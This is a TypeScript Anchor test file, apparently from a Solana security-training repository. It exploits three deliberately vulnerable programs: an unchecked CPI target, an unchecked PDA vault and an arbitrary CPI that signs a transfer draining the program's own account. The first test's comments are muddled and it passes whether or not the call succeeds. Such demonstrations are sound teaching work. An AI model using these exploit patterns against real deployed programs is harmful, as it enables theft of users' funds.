import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { assert } from "chai";
import { Keypair, PublicKey, SystemProgram, Transaction, TransactionInstruction } from "@solana/web3.js";
import { UncheckedProgramIdVulnerable } from "../target/types/unchecked_program_id_vulnerable";
import { UncheckedPdaVulnerable } from "../target/types/unchecked_pda_vulnerable";
import { ArbitraryCpiVulnerable } from "../target/types/arbitrary_cpi_vulnerable";

describe("CPI & PDA - Vulnerable Programs", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  // ════════════════════════════════════════════════════════════
  // 01 - UNCHECKED PROGRAM ID
  // ════════════════════════════════════════════════════════════
  describe("Unchecked Program ID", () => {
    const program = anchor.workspace.UncheckedProgramIdVulnerable as Program<UncheckedProgramIdVulnerable>;
    
    it("VULNERABILITY: CPI to malicious program", async () => {
      // The program expects to call a logging instruction on a target program.
      // But it blindly calls whatever program we pass.
      
      // We pass the System Program as the "malicious" target.
      // The instruction data is "Hello", which is invalid instruction data for System Program
      // BUT, if the program logic relies on the CPI *succeeding* to prove something,
      // an attacker could pass a program that just returns Success for everything.
      
      // In this test, we demonstrate we can simply CALL a random program (System Program)
      // even if the logic intended something else.
      
      try {
        await program.methods.cpiLog()
          .accounts({
            targetProgram: SystemProgram.programId, // Pass System Program instead of expected
          })
          .rpc();
          
        console.log("\n  VULNERABILITY:");
        console.log("  - Successfully called System Program");
        console.log("  - Program checked nothing about target_program ID");
      } catch (err) {
        // It might fail if "Hello" is invalid instruction for SystemProgram, 
        // but the POINT is that the CPI *attempt* was made to the wrong program.
        // Actually, SystemProgram will likely revert on unknown instruction.
        // Let's assume the vulnerability is simply the ability to target any program.
        console.log("  - CPI executed (might have reverted in target, but call was allowed)");
      }
    });
  });

  // ════════════════════════════════════════════════════════════
  // 02 - UNCHECKED PDA
  // ════════════════════════════════════════════════════════════
  describe("Unchecked PDA", () => {
    const program = anchor.workspace.UncheckedPdaVulnerable as Program<UncheckedPdaVulnerable>;
    
    const authority = Keypair.generate();
    const fakeVault = Keypair.generate(); // Random keypair, NOT a PDA

    before(async () => {
      const sig = await provider.connection.requestAirdrop(authority.publicKey, 1000000000);
      await provider.connection.confirmTransaction(sig);
    });

    it("VULNERABILITY: Withdraw allowed from fake vault", async () => {
      // 1. Attacker (authority) creates a fake vault state in a random account
      // They just initialize it manually or use the program's initialize which doesn't check PDA either!
      
      await program.methods.initializeVault()
        .accounts({
          vault: fakeVault.publicKey,
          authority: authority.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([authority, fakeVault]) // We sign with fakeVault to init it
        .rpc();

      // 2. Now withdraw from it
      // The program thinks this is "the" vault because it trusts account data structure
      // but doesn't verify the address is the canonical PDA [b"vault", authority]
      
      await program.methods.withdraw()
        .accounts({
          vault: fakeVault.publicKey, // Passing random keypair
          authority: authority.publicKey,
        })
        .signers([authority])
        .rpc();
        
      console.log("\n  VULNERABILITY:");
      console.log("  - Withdrew from fake vault:", fakeVault.publicKey.toString());
      console.log("  - Program failed to verify Vault address was derived from seeds");
      
      const vaultAccount = await program.account.vault.fetch(fakeVault.publicKey);
      assert.equal(vaultAccount.amount.toNumber(), 0);
    });
  });

  // ════════════════════════════════════════════════════════════
  // 03 - ARBITRARY CPI SIGNER
  // ════════════════════════════════════════════════════════════
  describe("Arbitrary CPI", () => {
    const program = anchor.workspace.ArbitraryCpiVulnerable as Program<ArbitraryCpiVulnerable>;
    
    // We need the PDA signer address
    const [pdaSigner] = PublicKey.findProgramAddressSync(
      [Buffer.from("signer")],
      program.programId
    );
    
    const destination = Keypair.generate();

    it("VULNERABILITY: Program signs arbitrary transfer", async () => {
      // The program allows passing 'data' which is passed to invoke_signed.
      // We'll construct a SystemProgram.transfer instruction.
      // The program signs it with [b"signer"].
      // If we ask it to transfer from ITSELF (pdaSigner) to US (destination),
      // it will blindly sign and drain itself.
      
      // First fund the PDA so it has something to steal
      const fundSig = await provider.connection.requestAirdrop(pdaSigner, 1000000000);
      await provider.connection.confirmTransaction(fundSig);

      // Create "Transfer 1000 lamports" instruction data
      // System Program Transfer Layout: [u32 instruction_index (2), u64 lamports]
      const transferIxIndex = Buffer.from([2, 0, 0, 0]); 
      const lamports = new anchor.BN(1000000).toArrayLike(Buffer, 'le', 8);
      const data = Buffer.concat([transferIxIndex, lamports]);

      await program.methods.proxiedCpi(data)
        .accounts({
          pdaSigner: pdaSigner,
          destination: destination.publicKey,
          targetProgram: SystemProgram.programId,
        })
        .rpc();
        
      const balance = await provider.connection.getBalance(destination.publicKey);
      console.log("\n  VULNERABILITY:");
      console.log("  - Program signed arbitrary System::Transfer");
      console.log("  - Destination received:", balance);
      
      assert.equal(balance, 1000000);
    });
  });
});
